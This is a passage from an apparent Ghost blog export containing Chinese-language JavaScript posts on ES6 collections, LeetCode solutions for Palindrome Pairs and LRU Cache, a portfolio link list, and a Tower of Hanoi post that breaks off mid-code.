Cat('花花')//箭头函数自动绑定了this","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-08T06:48:04.000Z","created_by":"1","updated_at":"2017-01-17T06:39:21.000Z","updated_by":"1","published_at":"2016-04-08T07:52:25.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d30b","uuid":"af18e574-5907-4e00-ae21-edc7439ae2b5","title":"作品展示","slug":"show","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n\\n[3d-Book](http://www.dadigua.win:8080/show/book/book5.html)\\n[3d-旗帜](http://www.dadigua.win:8080/show/Mesh/)\\n[黑洞](http://www.dadigua.win:8080/engine-master/examples/shaders/cs10.html) \\n[燃烧](http://www.dadigua.win:8080/engine-master/examples/shaders/cs9.html) \\n[3D字体](http://www.dadigua.win:8080/three/1.html) \\n[css3-3d](http://www.dadigua.win:8080/three/cs10.html)\\n[仿webQQ](http://www.dadigua.win:8080/three/cs7.html)\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><a href=\"http://www.dadigua.win:8080/show/book/book5.html\">3d-Book</a><br>\n<a href=\"http://www.dadigua.win:8080/show/Mesh/\">3d-旗帜</a><br>\n<a href=\"http://www.dadigua.win:8080/engine-master/examples/shaders/cs10.html\">黑洞</a><br>\n<a href=\"http://www.dadigua.win:8080/engine-master/examples/shaders/cs9.html\">燃烧</a><br>\n<a href=\"http://www.dadigua.win:8080/three/1.html\">3D字体</a><br>\n<a href=\"http://www.dadigua.win:8080/three/cs10.html\">css3-3d</a><br>\n<a href=\"http://www.dadigua.win:8080/three/cs7.html\">仿webQQ</a></p>\n<!--kg-card-end: markdown-->","comment_id":"78","plaintext":"3d-Book [http://www.dadigua.win:8080/show/book/book5.html]\n3d-旗帜 [http://www.dadigua.win:8080/show/Mesh/]\n黑洞 [http://www.dadigua.win:8080/engine-master/examples/shaders/cs10.html]\n燃烧 [http://www.dadigua.win:8080/engine-master/examples/shaders/cs9.html]\n3D字体 [http://www.dadigua.win:8080/three/1.html]\ncss3-3d [http://www.dadigua.win:8080/three/cs10.html]\n仿webQQ [http://www.dadigua.win:8080/three/cs7.html]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-01-21T00:51:49.000Z","created_by":"1","updated_at":"2016-08-12T19:36:47.000Z","updated_by":"1","published_at":"2016-01-21T01:01:44.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d30c","uuid":"e2b12bb8-8155-4420-8106-4373e5509de1","title":"ES6中Set、Map和WeakSet、WeakMap","slug":"es6zhong-set-maphe-weakmap","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"ES6 新增了几种集合类型，Set、Map 和WeakSet、WeakMap。\\n> #####Set\\n\\nSet 是 ES6 新增的有序列表集合，它不会包含重复项。数组可以存放任何类型的数据，不过数据除重需要自己实现。\\n```\\nvar set = new Set();\\nset.add(window);\\nset.has(window); // true\\nset.size; // 1\\nset.add(window);\\nset.add(1);\\nset.size; // 2\\nset.delete(window);\\nset.has(window); // false\\nset.clear();\\nset.size; // 0\\n```\\n```\\n注意：\\nSet 调用 add、has、delete 等方法时对 key 进行的比较，不做类型转换。可以认为使用 === 进行比较，当然也不全是 ===：  \\n1.Set 中，NaN 只能添加一次（虽然NaN === NaN 返回 false）；  \\n2.Set 中，「-0」和「0 或 +0」可以同时存在，因为符号不一样（虽然 -0 === 0 或 -0 === +0 返回 true）；  \\n```\\n> #####Map\\n\\nMap 是 ES6 新增的有序键值对集合。键值对的 key 和 value 都可以是任何类型的元素。而Object对象会对 key 进行 toString() 操作，这会导致某些 key 会意外覆盖之前的数据；如果 key 本身是一个对象，toString() 也得不到想要的结果，如下：\\n```\\nvar o = {};\\nvar key1 = 2;\\nvar key2 = { toString : function() { return 2 } };\\nvar key3 = { x : 1 };\\nvar key4 = { y : 2 };\\n\\no[key1] = 1;\\no[key2] = 2;\\no[key3] = 3;\\no[key4] = 4;\\n```\\n![](/content/images/2016/03/P6M-W6W150-1-7N9990EGEI.png)\\n最后，对象o只有两个属性。应为会调用toString()方法，或者说String强制转换。\\n```\\nString(key1)==='2'  \\nString(key2)==='2'  //虽然key2为对象，但是它有toString()方法。因此为'2'。  \\nString(key3)==='[object Object]'  \\nString(key4)==='[object Object]'  \\nString([])===''  \\nString([2])==='2'  \\nString([2,3])==='2,3'  \\nString(NaN)==='NaN'  \\nString(new Map())==='[object Map]'  \\nString(new Set())==='[object Set]'  \\nString(new WeakSet())==='[object WeakSet]'  \\n//////////////////////////////////////////\\ntypeof (new Set())===  \\ntypeof (new Object())===  \\ntypeof (new Array())===      //其实Array就是Object。是关联数组。  \\ntypeof (new Map())===\\\"object\\\"//都是'Object'  \\nnew Set().constructor===Set  //true  \\nnew Map().constructor===Map  //true  \\n```\\n使用方法：\\n```\\nvar map = new Map();  \\nvar key1 = {toString : function() { return 2}};  \\nvar key2 = 2;  \\nmap.set(key1, 1);  \\nmap.set(key2, 2);\\n\\nmap.has(key1); // true  \\nmap.has('2'); // false，类型不同  \\nmap.delete(2);  \\nmap.size; // 1  \\nmap.get(key2); // undefined \\n```\\n> #####WeakSet\\n\\nWeakSet 对象中存储的对象值都是被弱引用的, 如果没有其他的变量或属性引用这个对象值, 则这个对象值会被当成垃圾回收掉. 正因为这样, WeakSet 对象是无法被枚举的, 没有办法拿到它包含的所有元素。WeakSet主要用来储存DOM节点，当这些节点从文档移除时，不会引发内存泄漏。\\n\\n* 只存储对象类型元素。new WeakSet().add(1)//错误\\n* 有add/delete/clear/has三个方法，不能遍历，没有size属性等.\\n\\n> #####WeakMap\\n\\nWeakMap 相对于普通的 Map，也是键值对集合，只不过 WeakMap 的 key 只能是非空对象（non-null object）。WeakMap 对它的 key 仅保持弱引用，也就是说它不阻止垃圾回收器回收它所引用的 key。WeakMap 最大的好处是可以避免内存泄漏。一个仅被 WeakMap 作为 key 而引用的对象，会被垃圾回收器回收掉。 \\nWeakMap 拥有和 Map 类似的 set(key, value) 、get(key)、has(key)、delete(key) 和 clear() 方法，但没有 size 属性，也没有任何与迭代有关的方法。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>ES6 新增了几种集合类型，Set、Map 和WeakSet、WeakMap。</p>\n<blockquote>\n<h5 id=\"set\">Set</h5>\n</blockquote>\n<p>Set 是 ES6 新增的有序列表集合，它不会包含重复项。数组可以存放任何类型的数据，不过数据除重需要自己实现。</p>\n<pre><code>var set = new Set();\nset.add(window);\nset.has(window); // true\nset.size; // 1\nset.add(window);\nset.add(1);\nset.size; // 2\nset.delete(window);\nset.has(window); // false\nset.clear();\nset.size; // 0\n</code></pre>\n<pre><code>注意：\nSet 调用 add、has、delete 等方法时对 key 进行的比较，不做类型转换。可以认为使用 === 进行比较，当然也不全是 ===：  \n1.Set 中，NaN 只能添加一次（虽然NaN === NaN 返回 false）；  \n2.Set 中，「-0」和「0 或 +0」可以同时存在，因为符号不一样（虽然 -0 === 0 或 -0 === +0 返回 true）；  \n</code></pre>\n<blockquote>\n<h5 id=\"map\">Map</h5>\n</blockquote>\n<p>Map 是 ES6 新增的有序键值对集合。键值对的 key 和 value 都可以是任何类型的元素。而Object对象会对 key 进行 toString() 操作，这会导致某些 key 会意外覆盖之前的数据；如果 key 本身是一个对象，toString() 也得不到想要的结果，如下：</p>\n<pre><code>var o = {};\nvar key1 = 2;\nvar key2 = { toString : function() { return 2 } };\nvar key3 = { x : 1 };\nvar key4 = { y : 2 };\n\no[key1] = 1;\no[key2] = 2;\no[key3] = 3;\no[key4] = 4;\n</code></pre>\n<p><img src=\"/content/images/2016/03/P6M-W6W150-1-7N9990EGEI.png\" alt=\"\"><br>\n最后，对象o只有两个属性。应为会调用toString()方法，或者说String强制转换。</p>\n<pre><code>String(key1)==='2'  \nString(key2)==='2'  //虽然key2为对象，但是它有toString()方法。因此为'2'。  \nString(key3)==='[object Object]'  \nString(key4)==='[object Object]'  \nString([])===''  \nString([2])==='2'  \nString([2,3])==='2,3'  \nString(NaN)==='NaN'  \nString(new Map())==='[object Map]'  \nString(new Set())==='[object Set]'  \nString(new WeakSet())==='[object WeakSet]'  \n//////////////////////////////////////////\ntypeof (new Set())===  \ntypeof (new Object())===  \ntypeof (new Array())===      //其实Array就是Object。是关联数组。  \ntypeof (new Map())===&quot;object&quot;//都是'Object'  \nnew Set().constructor===Set  //true  \nnew Map().constructor===Map  //true  \n</code></pre>\n<p>使用方法：</p>\n<pre><code>var map = new Map();  \nvar key1 = {toString : function() { return 2}};  \nvar key2 = 2;  \nmap.set(key1, 1);  \nmap.set(key2, 2);\n\nmap.has(key1); // true  \nmap.has('2'); // false，类型不同  \nmap.delete(2);  \nmap.size; // 1  \nmap.get(key2); // undefined \n</code></pre>\n<blockquote>\n<h5 id=\"weakset\">WeakSet</h5>\n</blockquote>\n<p>WeakSet 对象中存储的对象值都是被弱引用的, 如果没有其他的变量或属性引用这个对象值, 则这个对象值会被当成垃圾回收掉. 正因为这样, WeakSet 对象是无法被枚举的, 没有办法拿到它包含的所有元素。WeakSet主要用来储存DOM节点，当这些节点从文档移除时，不会引发内存泄漏。</p>\n<ul>\n<li>只存储对象类型元素。new WeakSet().add(1)//错误</li>\n<li>有add/delete/clear/has三个方法，不能遍历，没有size属性等.</li>\n</ul>\n<blockquote>\n<h5 id=\"weakmap\">WeakMap</h5>\n</blockquote>\n<p>WeakMap 相对于普通的 Map，也是键值对集合，只不过 WeakMap 的 key 只能是非空对象（non-null object）。WeakMap 对它的 key 仅保持弱引用，也就是说它不阻止垃圾回收器回收它所引用的 key。WeakMap 最大的好处是可以避免内存泄漏。一个仅被 WeakMap 作为 key 而引用的对象，会被垃圾回收器回收掉。<br>\nWeakMap 拥有和 Map 类似的 set(key, value) 、get(key)、has(key)、delete(key) 和 clear() 方法，但没有 size 属性，也没有任何与迭代有关的方法。</p>\n<!--kg-card-end: markdown-->","comment_id":"79","plaintext":"ES6 新增了几种集合类型，Set、Map 和WeakSet、WeakMap。\n\n> Set\n\nSet 是 ES6 新增的有序列表集合，它不会包含重复项。数组可以存放任何类型的数据，不过数据除重需要自己实现。\n\nvar set = new Set();\nset.add(window);\nset.has(window); // true\nset.size; // 1\nset.add(window);\nset.add(1);\nset.size; // 2\nset.delete(window);\nset.has(window); // false\nset.clear();\nset.size; // 0\n\n\n注意：\nSet 调用 add、has、delete 等方法时对 key 进行的比较，不做类型转换。可以认为使用 === 进行比较，当然也不全是 ===：  \n1.Set 中，NaN 只能添加一次（虽然NaN === NaN 返回 false）；  \n2.Set 中，「-0」和「0 或 +0」可以同时存在，因为符号不一样（虽然 -0 === 0 或 -0 === +0 返回 true）；  \n\n\n> Map\n\nMap 是 ES6 新增的有序键值对集合。键值对的 key 和 value 都可以是任何类型的元素。而Object对象会对 key 进行 toString()\n操作，这会导致某些 key 会意外覆盖之前的数据；如果 key 本身是一个对象，toString() 也得不到想要的结果，如下：\n\nvar o = {};\nvar key1 = 2;\nvar key2 = { toString : function() { return 2 } };\nvar key3 = { x : 1 };\nvar key4 = { y : 2 };\n\no[key1] = 1;\no[key2] = 2;\no[key3] = 3;\no[key4] = 4;\n\n\n\n最后，对象o只有两个属性。应为会调用toString()方法，或者说String强制转换。\n\nString(key1)==='2'  \nString(key2)==='2'  //虽然key2为对象，但是它有toString()方法。因此为'2'。  \nString(key3)==='[object Object]'  \nString(key4)==='[object Object]'  \nString([])===''  \nString([2])==='2'  \nString([2,3])==='2,3'  \nString(NaN)==='NaN'  \nString(new Map())==='[object Map]'  \nString(new Set())==='[object Set]'  \nString(new WeakSet())==='[object WeakSet]'  \n//////////////////////////////////////////\ntypeof (new Set())===  \ntypeof (new Object())===  \ntypeof (new Array())===      //其实Array就是Object。是关联数组。  \ntypeof (new Map())===\"object\"//都是'Object'  \nnew Set().constructor===Set  //true  \nnew Map().constructor===Map  //true  \n\n\n使用方法：\n\nvar map = new Map();  \nvar key1 = {toString : function() { return 2}};  \nvar key2 = 2;  \nmap.set(key1, 1);  \nmap.set(key2, 2);\n\nmap.has(key1); // true  \nmap.has('2'); // false，类型不同  \nmap.delete(2);  \nmap.size; // 1  \nmap.get(key2); // undefined \n\n\n> WeakSet\n\nWeakSet 对象中存储的对象值都是被弱引用的, 如果没有其他的变量或属性引用这个对象值, 则这个对象值会被当成垃圾回收掉. 正因为这样, WeakSet\n对象是无法被枚举的, 没有办法拿到它包含的所有元素。WeakSet主要用来储存DOM节点，当这些节点从文档移除时，不会引发内存泄漏。\n\n * 只存储对象类型元素。new WeakSet().add(1)//错误\n * 有add/delete/clear/has三个方法，不能遍历，没有size属性等.\n\n> WeakMap\n\nWeakMap 相对于普通的 Map，也是键值对集合，只不过 WeakMap 的 key 只能是非空对象（non-null object）。WeakMap\n对它的 key 仅保持弱引用，也就是说它不阻止垃圾回收器回收它所引用的 key。WeakMap 最大的好处是可以避免内存泄漏。一个仅被 WeakMap 作为\nkey 而引用的对象，会被垃圾回收器回收掉。\nWeakMap 拥有和 Map 类似的 set(key, value) 、get(key)、has(key)、delete(key) 和 clear()\n方法，但没有 size 属性，也没有任何与迭代有关的方法。","feature_image":null,"featured":1,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-10T08:13:51.000Z","created_by":"1","updated_at":"2017-01-17T06:55:12.000Z","updated_by":"1","published_at":"2016-03-10T09:10:17.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d30d","uuid":"ef4342bf-3289-4b78-948b-d86658e7e861","title":"Palindrome Pairs--leetcode","slug":"palindrome-pairs","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Given a list of unique words. Find all pairs of distinct indices (i, j) in the given list, so that the concatenation of the two words, i.e. words[i] + words[j] is a palindrome.\\n\\n#####Example 1:\\nGiven words = [\\\"bat\\\", \\\"tab\\\", \\\"cat\\\"]\\nReturn [[0, 1], [1, 0]]\\nThe palindromes are [\\\"battab\\\", \\\"tabbat\\\"]\\n#####Example 2:\\nGiven words = [\\\"abcd\\\", \\\"dcba\\\", \\\"lls\\\", \\\"s\\\", \\\"sssll\\\"]\\nReturn [[0, 1], [1, 0], [3, 2], [2, 4]]\\nThe palindromes are [\\\"dcbaabcd\\\", \\\"abcddcba\\\", \\\"slls\\\", \\\"llssssll\\\"]\\n\\n求一组单词中是一对回文(对称的单词)的下标.\\n```\\n        var palindromePairs1 = function(words) {\\n            var result=[];\\n            for(var i=0;i<words.length;i++){\\n                // words[i].CharAt(0)\\n                loop:\\n                        for(var j=0;j<words.length;j++){\\n                            if(i===j){continue;}\\n                            var str=words[i]+words[j];\\n                            for(var k=0;k<Math.floor(str.length/2);k++)\\n                            {\\n                                if(str.charAt(k)!=str.charAt(str.length-1-k)){\\n                                    continue loop;\\n                                }\\n                            }\\n                            result.push([i,j]);\\n                        }\\n            }\\n            return result;\\n        };\\n```\\n上面的答案，是超时的。可能原因是，charAt(n)。时间复杂度为O(n)。这里要循环遍历整个字符串。所有以时间复杂度为O(n!)。n越大，操作越多。这里把var str=words[i]+words[j];加大了操作次数。\\n```\\n        var palindromePairs = function(words) {\\n            var result=[];\\n            for(var i=0;i<words.length;i++){\\n                // words[i].CharAt(0)\\n                loop:\\n                        for(var j=0;j<words.length;j++){\\n                            if(i===j){continue;}\\n             //               var str=words[i]+words[j];\\n                            var LongStr;\\n                            var length;\\n                            var left;\\n                            if(words[i].length<words[j].length){\\n                                length =  words[i].length;\\n                                LongStr=words[j];\\n                                left=j;\\n                            }else{\\n                                length =  words[j].length;\\n                                LongStr = words[i];\\n                                left=i;\\n                            }\\n\\n                            for(var k=0;k<length;k++)\\n                            {\\n                                if(words[i].charAt(k)!=words[j].charAt(words[j].length-1-k)){\\n                                    continue loop;\\n                                }\\n                            }\\n                            if(left==j){\\n                                for(var k=0;k<Math.floor((LongStr.length-length)/2);k++)\\n                                {\\n                                    if(LongStr.charAt(k)!=LongStr.charAt(LongStr.length-length-1-k)){\\n                                        continue loop;\\n                                    }\\n                                }\\n                            }else{\\n                                for(var k=length;k<Math.floor((LongStr.length-length)/2)+length;k++)\\n                                {\\n                                    if(LongStr.charAt(k)!=LongStr.charAt(LongStr.length+length-k-1)){\\n                                        continue loop;\\n                                    }\\n                                }\\n                            }\\n\\n                            result.push([i,j]);\\n                        }\\n            }\\n            return result;\\n        };//Runtime: 1473 ms\\n\\n```\\n这次通过了。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Given a list of unique words. Find all pairs of distinct indices (i, j) in the given list, so that the concatenation of the two words, i.e. words[i] + words[j] is a palindrome.</p>\n<h5 id=\"example1\">Example 1:</h5>\n<p>Given words = [&quot;bat&quot;, &quot;tab&quot;, &quot;cat&quot;]<br>\nReturn [[0, 1], [1, 0]]<br>\nThe palindromes are [&quot;battab&quot;, &quot;tabbat&quot;]</p>\n<h5 id=\"example2\">Example 2:</h5>\n<p>Given words = [&quot;abcd&quot;, &quot;dcba&quot;, &quot;lls&quot;, &quot;s&quot;, &quot;sssll&quot;]<br>\nReturn [[0, 1], [1, 0], [3, 2], [2, 4]]<br>\nThe palindromes are [&quot;dcbaabcd&quot;, &quot;abcddcba&quot;, &quot;slls&quot;, &quot;llssssll&quot;]</p>\n<p>求一组单词中是一对回文(对称的单词)的下标.</p>\n<pre><code>        var palindromePairs1 = function(words) {\n            var result=[];\n            for(var i=0;i&lt;words.length;i++){\n                // words[i].CharAt(0)\n                loop:\n                        for(var j=0;j&lt;words.length;j++){\n                            if(i===j){continue;}\n                            var str=words[i]+words[j];\n                            for(var k=0;k&lt;Math.floor(str.length/2);k++)\n                            {\n                                if(str.charAt(k)!=str.charAt(str.length-1-k)){\n                                    continue loop;\n                                }\n                            }\n                            result.push([i,j]);\n                        }\n            }\n            return result;\n        };\n</code></pre>\n<p>上面的答案，是超时的。可能原因是，charAt(n)。时间复杂度为O(n)。这里要循环遍历整个字符串。所有以时间复杂度为O(n!)。n越大，操作越多。这里把var str=words[i]+words[j];加大了操作次数。</p>\n<pre><code>        var palindromePairs = function(words) {\n            var result=[];\n            for(var i=0;i&lt;words.length;i++){\n                // words[i].CharAt(0)\n                loop:\n                        for(var j=0;j&lt;words.length;j++){\n                            if(i===j){continue;}\n             //               var str=words[i]+words[j];\n                            var LongStr;\n                            var length;\n                            var left;\n                            if(words[i].length&lt;words[j].length){\n                                length =  words[i].length;\n                                LongStr=words[j];\n                                left=j;\n                            }else{\n                                length =  words[j].length;\n                                LongStr = words[i];\n                                left=i;\n                            }\n\n                            for(var k=0;k&lt;length;k++)\n                            {\n                                if(words[i].charAt(k)!=words[j].charAt(words[j].length-1-k)){\n                                    continue loop;\n                                }\n                            }\n                            if(left==j){\n                                for(var k=0;k&lt;Math.floor((LongStr.length-length)/2);k++)\n                                {\n                                    if(LongStr.charAt(k)!=LongStr.charAt(LongStr.length-length-1-k)){\n                                        continue loop;\n                                    }\n                                }\n                            }else{\n                                for(var k=length;k&lt;Math.floor((LongStr.length-length)/2)+length;k++)\n                                {\n                                    if(LongStr.charAt(k)!=LongStr.charAt(LongStr.length+length-k-1)){\n                                        continue loop;\n                                    }\n                                }\n                            }\n\n                            result.push([i,j]);\n                        }\n            }\n            return result;\n        };//Runtime: 1473 ms\n\n</code></pre>\n<p>这次通过了。</p>\n<!--kg-card-end: markdown-->","comment_id":"80","plaintext":"Given a list of unique words. Find all pairs of distinct indices (i, j) in the\ngiven list, so that the concatenation of the two words, i.e. words[i] + words[j]\nis a palindrome.\n\nExample 1:\nGiven words = [\"bat\", \"tab\", \"cat\"]\nReturn [[0, 1], [1, 0]]\nThe palindromes are [\"battab\", \"tabbat\"]\n\nExample 2:\nGiven words = [\"abcd\", \"dcba\", \"lls\", \"s\", \"sssll\"]\nReturn [[0, 1], [1, 0], [3, 2], [2, 4]]\nThe palindromes are [\"dcbaabcd\", \"abcddcba\", \"slls\", \"llssssll\"]\n\n求一组单词中是一对回文(对称的单词)的下标.\n\n        var palindromePairs1 = function(words) {\n            var result=[];\n            for(var i=0;i<words.length;i++){\n                // words[i].CharAt(0)\n                loop:\n                        for(var j=0;j<words.length;j++){\n                            if(i===j){continue;}\n                            var str=words[i]+words[j];\n                            for(var k=0;k<Math.floor(str.length/2);k++)\n                            {\n                                if(str.charAt(k)!=str.charAt(str.length-1-k)){\n                                    continue loop;\n                                }\n                            }\n                            result.push([i,j]);\n                        }\n            }\n            return result;\n        };\n\n\n上面的答案，是超时的。可能原因是，charAt(n)。时间复杂度为O(n)。这里要循环遍历整个字符串。所有以时间复杂度为O(n!)。n越大，操作越多。这里把var\nstr=words[i]+words[j];加大了操作次数。\n\n        var palindromePairs = function(words) {\n            var result=[];\n            for(var i=0;i<words.length;i++){\n                // words[i].CharAt(0)\n                loop:\n                        for(var j=0;j<words.length;j++){\n                            if(i===j){continue;}\n             //               var str=words[i]+words[j];\n                            var LongStr;\n                            var length;\n                            var left;\n                            if(words[i].length<words[j].length){\n                                length =  words[i].length;\n                                LongStr=words[j];\n                                left=j;\n                            }else{\n                                length =  words[j].length;\n                                LongStr = words[i];\n                                left=i;\n                            }\n\n                            for(var k=0;k<length;k++)\n                            {\n                                if(words[i].charAt(k)!=words[j].charAt(words[j].length-1-k)){\n                                    continue loop;\n                                }\n                            }\n                            if(left==j){\n                                for(var k=0;k<Math.floor((LongStr.length-length)/2);k++)\n                                {\n                                    if(LongStr.charAt(k)!=LongStr.charAt(LongStr.length-length-1-k)){\n                                        continue loop;\n                                    }\n                                }\n                            }else{\n                                for(var k=length;k<Math.floor((LongStr.length-length)/2)+length;k++)\n                                {\n                                    if(LongStr.charAt(k)!=LongStr.charAt(LongStr.length+length-k-1)){\n                                        continue loop;\n                                    }\n                                }\n                            }\n\n                            result.push([i,j]);\n                        }\n            }\n            return result;\n        };//Runtime: 1473 ms\n\n\n\n这次通过了。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-12T08:40:35.000Z","created_by":"1","updated_at":"2017-01-17T06:52:09.000Z","updated_by":"1","published_at":"2016-03-12T09:28:54.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d30e","uuid":"8f296104-e208-4a7f-a4dc-60f1c68f5a1a","title":"LRU Cache--LeetCode","slug":"lru-cache-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set.\\n\\n`get(key)` - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.\\n\\n`set(key, value)` - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.\\n\\n这里直接用JS中的Map数据结构。Map是有顺序的，后加的在在后面。JS中的Map应该不是Hash_Map(unordered_map)，应该是TreeMap(红黑树)，因为它是有顺序。用Array会超时。这道题用JS实现没啥含量，数据结构不是自己写的。不过ES6的Map确实很有用。在LeetCode上，比很多的语言快。\\n```\\n        var LRUCache = function(capacity) {\\n            this.size=capacity;\\n            this.map=new Map();\\n\\n        };\\n        LRUCache.prototype.get = function(key) {\\n            var value= this.map.get(key);\\n\\n            if(value===undefined){return -1;}else{\\n                this.map.delete(key)\\n                this.map.set(key,value)\\n                return value;\\n            }\\n        };\\n        LRUCache.prototype.set = function(key, value) {\\n            if(this.map.has(key)){\\n                this.map.delete(key)\\n            }\\n\\n            this.map.set(key, value);\\n            if(this.map.size>this.size){\\n                for(var x of this.map.keys()){\\n                    this.map.delete(x);\\n                    return;\\n                }\\n            }\\n        }//Runtime: 200 ms  94.12%\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set.</p>\n<p><code>get(key)</code> - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.</p>\n<p><code>set(key, value)</code> - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.</p>\n<p>这里直接用JS中的Map数据结构。Map是有顺序的，后加的在在后面。JS中的Map应该不是Hash_Map(unordered_map)，应该是TreeMap(红黑树)，因为它是有顺序。用Array会超时。这道题用JS实现没啥含量，数据结构不是自己写的。不过ES6的Map确实很有用。在LeetCode上，比很多的语言快。</p>\n<pre><code>        var LRUCache = function(capacity) {\n            this.size=capacity;\n            this.map=new Map();\n\n        };\n        LRUCache.prototype.get = function(key) {\n            var value= this.map.get(key);\n\n            if(value===undefined){return -1;}else{\n                this.map.delete(key)\n                this.map.set(key,value)\n                return value;\n            }\n        };\n        LRUCache.prototype.set = function(key, value) {\n            if(this.map.has(key)){\n                this.map.delete(key)\n            }\n\n            this.map.set(key, value);\n            if(this.map.size&gt;this.size){\n                for(var x of this.map.keys()){\n                    this.map.delete(x);\n                    return;\n                }\n            }\n        }//Runtime: 200 ms  94.12%\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"81","plaintext":"Design and implement a data structure for Least Recently Used (LRU) cache. It\nshould support the following operations: get and set.\n\nget(key) - Get the value (will always be positive) of the key if the key exists\nin the cache, otherwise return -1.\n\nset(key, value) - Set or insert the value if the key is not already present.\nWhen the cache reached its capacity, it should invalidate the least recently\nused item before inserting a new item.\n\n这里直接用JS中的Map数据结构。Map是有顺序的，后加的在在后面。JS中的Map应该不是Hash_Map(unordered_map)，应该是TreeMap(红黑树)，因为它是有顺序。用Array会超时。这道题用JS实现没啥含量，数据结构不是自己写的。不过ES6的Map确实很有用。在LeetCode上，比很多的语言快。\n\n        var LRUCache = function(capacity) {\n            this.size=capacity;\n            this.map=new Map();\n\n        };\n        LRUCache.prototype.get = function(key) {\n            var value= this.map.get(key);\n\n            if(value===undefined){return -1;}else{\n                this.map.delete(key)\n                this.map.set(key,value)\n                return value;\n            }\n        };\n        LRUCache.prototype.set = function(key, value) {\n            if(this.map.has(key)){\n                this.map.delete(key)\n            }\n\n            this.map.set(key, value);\n            if(this.map.size>this.size){\n                for(var x of this.map.keys()){\n                    this.map.delete(x);\n                    return;\n                }\n            }\n        }//Runtime: 200 ms  94.12%","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-03-10T06:27:23.000Z","created_by":"1","updated_at":"2017-01-17T06:55:46.000Z","updated_by":"1","published_at":"2016-03-10T06:38:55.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d30f","uuid":"e2b076ca-41c8-4c5c-b016-9b11e7a4190c","title":"递归和迭代(循环)解决汉罗塔问题(javascript)","slug":"di-gui-he-xun-huan-jie-jue-yi-luo-ta-wen-ti","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"递归和迭代都是循环的一种。网上很多都是用递归解决汉罗塔，。今天研究了下用迭代解决。 先贴出递归的javascript版。大家可以到chrome控制台直接调试。\\n\\n```\\nvar j=0;  \\n        function Hanoi(n,a,b,c){\\n            if(n>=1){\\n                Hanoi(n-1,a,c,b);\\n                j++;\\n                console.log('第'+j+'部从'+a+'移动到'+c);\\n                Hanoi(n-1,b,a,c);\\n            }\\n        }\\n        Hanoi(7,'A','B','C')\\n```\\n大多数的递归都可以改写成循环，递归从上而下。循环从下往上；递归由系统压栈，循环则要自己存储。就是，用简单的循环来代替递归的话，有时必须要手工维护一个数据结构。\\n\\n循环的解法\\n```\\n    Array.prototype.Run=function(to){\\n            if(to=='left'){\\n                for(var i=0;i<this.length;i++){\\n                    if(this[i].from=='B'){this[i].from='C';}else{\\n                        if(this[i].from=='C'){this[i].from='B';}\\n                    }\\n                    if(this[i].to=='B'){this[i].to='C';}else{\\n                        if(this[i].to=='C'){this[i].to='B';}\\n                    }\\n                }\\n            }\\n            if(to=='right'){\\n                for(var i=0;i<this.length;i++){\\n                    if(this[i].from=='A'){this[i].from='B';}\\n                    else{\\n                        if(this[i].from=='B'){this[i].from='A';}\\n                    }\\n\\n                    if(this[i].to=='A'){this[i].to='B';}else{\\n                        if(this[i].to=='B'){this[i].to='A';}\\n                    }\\n\\n                }\\n            }\\n            return this;\\n        }\\n        function hanoi3(n){\\n            var a='A';\\n            var b='B';\\n            var c='C';\\n            var temp=1;\\n            for(var i=0;i<n;i++){\\n                temp = temp+temp+1;\\n                if(i==0){ s.push(new to(a,c));continue;}\\n                var temp =cloneObj(s);\\n                var temp2=cloneObj(s);\\n                s = temp.Run('left').concat([new to(a,c)],temp2.Run('right'));\\n            }\\n\\n            for(var i=0;i< s.length;i++){\\n\\n                console.log('第'+(i+1)+'从'+s[i].from+'移动到'+s[i].to);\\n            }\\n\\n        }\\n\\n\\n        var cloneObj = 